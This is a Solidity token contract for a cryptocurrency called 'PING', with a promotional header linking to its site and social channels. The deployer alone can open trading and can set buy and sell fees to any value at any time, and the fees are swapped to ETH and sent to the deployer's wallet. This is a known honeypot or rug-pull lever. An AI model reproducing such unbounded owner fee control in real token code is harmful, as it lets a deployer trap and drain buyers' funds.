/*

 .----------------.  .----------------.  .-----------------. .----------------. 
| .--------------. || .--------------. || .--------------. || .--------------. |
| |   ______     | || |     _____    | || | ____  _____  | || |    ______    | |
| |  |_   __ \   | || |    |_   _|   | || ||_   \|_   _| | || |  .' ___  |   | |
| |    | |__) |  | || |      | |     | || |  |   \ | |   | || | / .'   \_|   | |
| |    |  ___/   | || |      | |     | || |  | |\ \| |   | || | | |    ____  | |
| |   _| |_      | || |     _| |_    | || | _| |_\   |_  | || | \ `.___]  _| | |
| |  |_____|     | || |    |_____|   | || ||_____|\____| | || |  `._____.'   | |
| |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------' 

https://pingerc.com
https://t.me/Pingannouncement
https://dashboard.pingerc.com
https://x.com/pingerc20

$PING revolutionizing and simplifying the search for alpha on chain using custom ai tools.

*/


// SPDX-License-Identifier: unlicense

pragma solidity 0.8.21;
    
interface IUniswapV2Router02 {
     function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
    
    contract PING {
        string public   name_ = "Ping"; 
        string public   symbol_ = "PING";  
        uint8 public constant decimals = 18;
        uint256 public constant totalSupply = 1000000 * 10**decimals;

        uint256 buyFees = 5;
        uint256 sellFees = 5;
        uint256 constant swapAmount = totalSupply / 100;

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;
        
        error Permissions();
        
        
    
        function name() public view virtual returns (string memory) {
        return name_;
        }

    
        function symbol() public view virtual returns (string memory) {
        return symbol_;
        }    

        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed owner,
            address indexed spender,
            uint256 value
        );
        

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant deployer = payable(address(0x5cD3bE7FB27A3734c8aeBd469cc06115cA4E1bBB));

        bool private swapping;
        bool private tradingOpen;

        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

        receive() external payable {}

        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingOpen || from == deployer || to == deployer);

            if(!tradingOpen && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new  address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
                deployer.transfer(address(this).balance);
                swapping = false;
            }

            if(from != address(this)){
                uint256 FeesAmount = amount * (from == pair ? buyFees : sellFees) / 100;
                amount -= FeesAmount;
                balanceOf[address(this)] += FeesAmount;
            }
            balanceOf[to] += amount;
            emit Transfer(from, to, amount);
            return true;
        }

        function openTrading() external {
            require(msg.sender == deployer);
            require(!tradingOpen);
            tradingOpen = true;        
        }

        function _setFees(uint256 _buy, uint256 _sell) private {
            buyFees = _buy;
            sellFees = _sell;
        }

        function setFees(uint256 _buy, uint256 _sell) external {
            if(msg.sender != deployer)        
                revert Permissions();
            _setFees(_buy, _sell);
        }
    }